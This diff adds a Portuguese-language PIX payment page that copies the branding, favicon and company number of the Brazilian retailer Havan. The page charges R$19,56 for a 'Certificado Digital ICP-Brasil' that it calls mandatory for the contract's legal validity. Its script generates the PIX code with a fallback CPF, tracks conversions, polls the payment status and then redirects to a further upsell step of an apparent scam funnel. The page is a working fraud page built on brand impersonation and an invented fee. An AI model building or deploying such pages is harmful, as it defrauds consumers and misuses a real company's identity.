@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pagamento PIX - Havan</title>
+<link rel="shortcut icon" href="https://www.havan.com.br/favicon.ico" type="image/x-icon">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+window.pixelId = "67c65ea78480a2789186da08";
+var a = document.createElement("script"); a.setAttribute("async",""); a.setAttribute("defer","");
+a.setAttribute("src","https://cdn.utmify.com.br/scripts/pixel/pixel.js"); document.head.appendChild(a);
+</script>
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+<script>
+tailwind.config = { theme: { extend: { colors: { 'havan-blue':'#003399','havan-light-blue':'#0055cc','havan-yellow':'#ffcc00','havan-gray':'#f4f4f4','havan-dark':'#1a1a1a' } } } }
+</script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap');
+body { font-family:'Montserrat',sans-serif; background:#f4f4f4; color:#333; margin:0; padding:0; }
+.havan-header { background:#003399; border-bottom:4px solid #ffcc00; }
+.havan-button { background:#003399; color:#fff; font-weight:700; border-radius:8px; padding:14px 20px; text-transform:uppercase; font-size:16px; box-shadow:0 4px 6px rgba(0,0,0,0.1); transition:all .3s; }
+.havan-button:hover { background:#002266; transform:translateY(-2px); }
+.havan-card { border-radius:12px; box-shadow:0 10px 25px rgba(0,0,0,0.1); overflow:hidden; }
+.notification-popup { position:fixed; top:20px; right:-300px; background:#28a745; color:#fff; padding:16px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.15); z-index:1000; transition:right .3s; display:flex; align-items:center; gap:8px; }
+.notification-popup.show { right:20px; }
+#imagemContainer img { margin:0 auto; }
+</style>
+</head>
+<body class="min-h-screen pb-10">
+<div id="notification" class="notification-popup">
+  <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+  <span>Cdigo PIX copiado!</span>
+</div>
+
+<header class="havan-header flex px-6 h-20 items-center justify-center">
+  <div style="color:#fff; font-weight:800; font-size:28px; letter-spacing:2px;">HAVAN</div>
+</header>
+
+<main id="paymentPage" class="max-w-lg mx-auto mt-8 px-4">
+  <div class="bg-white havan-card">
+    <div class="px-6 py-4 bg-gray-50 border-b border-gray-200 flex items-center justify-between">
+      <div>
+        <h2 class="text-xl font-bold text-havan-blue">Pagamento PIX</h2>
+        <p class="text-xs font-semibold text-gray-600 mt-1">Havan - Checkout Seguro</p>
+      </div>
+      <div id="status-badge" class="bg-havan-yellow text-havan-blue text-xs font-bold px-3 py-1 rounded-full">AGUARDANDO</div>
+    </div>
+
+    <div class="px-6 py-8 text-center border-b border-gray-100">
+      <h3 class="text-lg font-bold text-gray-800 mb-2" id="upsell-title">Certificado Digital ICP-Brasil</h3>
+      <p class="text-sm text-gray-500" id="upsell-desc">Assinatura digital obrigatria para validade jurdica do contrato.</p>
+      <div class="text-3xl font-black text-havan-blue mt-4" id="display-amount">R$ 0,00</div>
+    </div>
+
+    <div class="px-6 py-8">
+      <div id="imagemContainer" class="bg-white p-4 rounded-xl border-2 border-dashed border-gray-200 cursor-pointer hover:border-havan-blue transition-all group relative flex flex-col items-center justify-center" style="min-height:280px;" onclick="copiarPixCode()">
+        <div id="loading-placeholder" class="text-center text-gray-400">
+          <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-havan-blue mx-auto mb-4"></div>
+          <p class="font-medium">Gerando seu QR Code...</p>
+        </div>
+      </div>
+
+      <div class="mt-6">
+        <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Cdigo PIX Copia e Cola</label>
+        <input id="codigo-input" type="text" readonly value="Carregando..." class="w-full bg-gray-50 border border-gray-200 rounded-lg px-4 py-3 text-sm font-mono text-gray-600 focus:outline-none">
+      </div>
+
+      <button onclick="copiarPixCode()" class="havan-button w-full mt-4 flex items-center justify-center gap-2">COPIAR CDIGO PIX</button>
+    </div>
+
+    <div class="px-6 py-6 bg-gray-50 text-center">
+      <p class="text-[10px] text-gray-400">Havan S.A. - CNPJ: 79.379.491/0001-83</p>
+    </div>
+  </div>
+</main>
+
+<div id="successPage" class="hidden max-w-lg mx-auto mt-8 px-4">
+  <div class="bg-white havan-card p-8 text-center">
+    <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6">
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+    </div>
+    <h1 class="text-2xl font-black text-havan-blue mb-2">PAGAMENTO APROVADO!</h1>
+    <p class="text-gray-600 mb-8">Seu pagamento foi processado com sucesso. Voc ser redirecionado...</p>
+  </div>
+</div>
+
+<script>
+const API_URL = '/api/pix/create';
+const STATUS_URL = '/api/pix/status';
+const REDIRECT_URL = '/funil/pos/up3/';
+const AMOUNT = 1956;
+const PRODUCT = 'upsell-2';
+const TITLE = 'Certificado Digital ICP-Brasil';
+const DESC = 'Assinatura digital obrigatória para validade jurídica do contrato.';
+
+let pixCode = null;
+let transactionId = null;
+let statusInterval = null;
+
+function cleanString(s){ return s ? s.replace(/\{\{|\}\}/g,'').trim() : ''; }
+function cleanCPF(c){ return c ? c.replace(/\D/g,'') : ''; }
+
+async function generatePix() {
+  try {
+    const urlParams = new URLSearchParams(window.location.search);
+    const dadosLS = JSON.parse(localStorage.getItem('dadosCPF')) || {};
+    let nome = cleanString(urlParams.get('nome') || dadosLS.nomeCompleto || 'Cliente Havan');
+    let cpf = cleanCPF(urlParams.get('cpf') || dadosLS.cpf || '57948135715');
+    if (cpf.length !== 11) cpf = '57948135715';
+
+    const payload = {
+      amount: AMOUNT,
+      description: TITLE,
+      customer: { name: nome, document: cpf, email: 'cliente@havan.com.br', phone: '11999999999' },
+      item: { title: TITLE, price: AMOUNT, quantity: 1 },
+      paymentMethod: 'PIX',
+      utm: window.location.search.substring(1),
+      product: PRODUCT
+    };
+
+    const res = await fetch(API_URL, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) });
+    const result = await res.json();
+    if (result.pixCode) {
+      pixCode = result.pixCode;
+      transactionId = result.transactionId;
+      document.getElementById('codigo-input').value = pixCode;
+      renderQRCode(pixCode);
+      statusInterval = setInterval(checkStatus, 5000);
+      if (window.utmify && window.utmify.sendEvent) window.utmify.sendEvent('checkout', { value: AMOUNT/100 });
+    }
+  } catch(e) { console.error(e); }
+}
+
+async function checkStatus() {
+  if (!transactionId) return;
+  try {
+    const res = await fetch(`${STATUS_URL}?transactionId=${transactionId}`);
+    const r = await res.json();
+    if (r.status === 'COMPLETED') {
+      clearInterval(statusInterval);
+      if (window.utmify && window.utmify.sendEvent) window.utmify.sendEvent('purchase', { value: AMOUNT/100 });
+      document.getElementById('paymentPage').classList.add('hidden');
+      document.getElementById('successPage').classList.remove('hidden');
+      setTimeout(() => { window.location.replace(REDIRECT_URL + window.location.search); }, 2000);
+    }
+  } catch(e){}
+}
+
+function renderQRCode(text) {
+  const c = document.getElementById('imagemContainer');
+  c.innerHTML = '';
+  new QRCode(c, { text: text, width: 240, height: 240, colorDark: '#003399', colorLight: '#ffffff', correctLevel: QRCode.CorrectLevel.L });
+}
+
+function copiarPixCode() {
+  if (!pixCode) return;
+  navigator.clipboard.writeText(pixCode).then(() => {
+    const p = document.getElementById('notification');
+    p.classList.add('show');
+    setTimeout(() => p.classList.remove('show'), 3000);
+  });
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('display-amount').innerText = 'R$ ' + (AMOUNT/100).toFixed(2).replace('.', ',');
+  generatePix();
+});
+</script>
+</body>
+</html>
